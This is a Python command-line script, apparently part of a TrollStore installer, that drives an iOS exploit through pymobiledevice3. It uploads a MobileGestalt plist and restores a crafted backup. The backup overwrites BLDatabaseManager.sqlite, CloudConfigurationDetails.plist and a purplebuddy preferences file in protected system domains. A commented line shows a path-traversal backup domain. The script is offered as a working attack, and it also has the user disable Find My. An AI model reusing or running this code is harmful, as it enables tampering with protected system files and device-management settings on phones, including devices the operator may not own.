import platform
import sys
import traceback
import os
from pathlib import Path

import click
import requests
from packaging.version import parse as parse_version
from pymobiledevice3.cli.cli_common import Command
from pymobiledevice3.exceptions import NoDeviceConnectedError, PyMobileDevice3Exception
from pymobiledevice3.lockdown import LockdownClient
from pymobiledevice3.services.diagnostics import DiagnosticsService
from pymobiledevice3.services.installation_proxy import InstallationProxyService
from pymobiledevice3.services.afc import AfcService

from exploit import backup, perform_restore

def get_base_path() -> str:
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    else:
        return os.path.dirname(os.path.abspath(__file__))

def exit(code=0):
    sys.exit(code)


@click.command(cls=Command)
@click.option(
    "--local-file",
    "local_file",
    type=click.Path(exists=True, dir_okay=False),
    required=False,
    help="Path to local com.apple.MobileGestalt.plist file",
)
@click.pass_context
def cli(ctx, service_provider: LockdownClient, local_file) -> None:
    os_names = {
        "iPhone": "iOS",
        "iPad": "iPadOS",
        "iPod": "iOS",
        "AppleTV": "tvOS",
        "Watch": "watchOS",
        "AudioAccessory": "HomePod Software Version",
        "RealityDevice": "visionOS",
    }

    device_class = service_provider.get_value(key="DeviceClass")
    device_build = service_provider.get_value(key="BuildVersion")
    device_version = parse_version(service_provider.product_version)

    if not all([device_class, device_build, device_version]):
        click.secho("Failed to get device information!", fg="red")
        click.secho("Make sure your device is connected and try again.", fg="red")
        return

    os_name = (os_names[device_class] + " ") if device_class in os_names else ""
    click.secho(f"Device info: {os_name}{device_version} ({device_build})", fg="green")

    # Upload com.apple.MobileGestalt.plist
    click.secho("Uploading com.apple.MobileGestalt.plist", fg="yellow")
    if local_file is None:
        local_file = get_base_path() + "/com.apple.MobileGestalt.plist"
    remote_file = "iTunesMetadata.plist"
    AfcService(lockdown=service_provider).push(local_file, remote_file)


    e_file = get_base_path() + "/BLDatabaseManager.sqlite"
    e_contents = open(e_file, "rb").read()

    config_file = get_base_path() + "/CloudConfigurationDetails.plist"
    config_contents = open(config_file, "rb").read()
    
    purplebuddy_file = get_base_path() + "/com.apple.purplebuddy.plist"
    purplebuddy_contents = open(purplebuddy_file, "rb").read()

    click.secho("Replacing BLDatabaseManager.sqlite", fg="yellow")
    back = backup.Backup(
        files=[
            backup.Directory("", "SysSharedContainerDomain-systemgroup.com.apple.media.shared.books"),
            backup.Directory(
                "Documents",
                f"SysSharedContainerDomain-systemgroup.com.apple.media.shared.books",
                owner=501,
                group=501,
            ),
             backup.Directory(
                "Documents/BLDatabaseManager",
                f"SysSharedContainerDomain-systemgroup.com.apple.media.shared.books",
                owner=501,
                group=501,
            ),
            backup.ConcreteFile(
                "Documents/BLDatabaseManager/BLDatabaseManager.sqlite",
                f"SysSharedContainerDomain-systemgroup.com.apple.media.shared.books",
                owner=501,
                group=501,
                contents=e_contents,
                inode=0
            ),
             backup.Directory(
                "",
                "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles",
                owner=501,
                group=501,
            ),
             backup.Directory(
                "Library",
                "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles",
                owner=501,
                group=501,
            ),
             backup.Directory(
                "Library/ConfigurationProfiles",
                "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles",
                owner=501,
                group=501,
            ),
            backup.ConcreteFile(
                "Library/ConfigurationProfiles/CloudConfigurationDetails.plist",
                "SysSharedContainerDomain-systemgroup.com.apple.configurationprofiles",
                contents=config_contents,
                owner=501,
                group=501
            ),
             backup.Directory(
                "mobile",
                "ManagedPreferencesDomain",
                owner=501,
                group=501,
            ),
            backup.ConcreteFile(
                path="mobile/com.apple.purplebuddy.plist",
                domain="ManagedPreferencesDomain",
                contents=purplebuddy_contents,
                owner=501,
                group=501
            ),
            #backup.ConcreteFile("", "SysContainerDomain-../../../../../../../.." + "/crash_on_purpose", contents=b""),
        ]
    )

    try:
        perform_restore(back, reboot=False, lockdown_client=service_provider)
    except PyMobileDevice3Exception as e:
        click.secho(f"Error during restore: {e}", fg="red")
        if "Find My" in str(e):
            click.secho("Find My must be disabled in order to use this tool.", fg="red")
            click.secho("Disable Find My from Settings (Settings -> [Your Name] -> Find My) and then try again.", fg="red")
            exit(1)
        elif "crash_on_purpose" not in str(e):
            raise e

    click.secho("Rebooting device", fg="green")

    with DiagnosticsService(service_provider) as diagnostics_service:
        diagnostics_service.restart()

    click.secho("Make sure you turn Find My iPhone back on if you use it after rebooting.", fg="green")
    click.secho("Make sure to install a proper persistence helper into the app you chose after installing TrollStore!\n", fg="green")


def main():
    try:
        cli(standalone_mode=False)
    except NoDeviceConnectedError:
        click.secho("No device connected!", fg="red")
        click.secho("Please connect your device and try again.", fg="red")
        exit(1)
    except click.UsageError as e:
        click.secho(e.format_message(), fg="red")
        click.echo(cli.get_help(click.Context(cli)))
        exit(2)
    except Exception:
        click.secho("An error occurred!", fg="red")
        click.secho(traceback.format_exc(), fg="red")
        exit(1)

    exit(0)


if __name__ == "__main__":
    main()
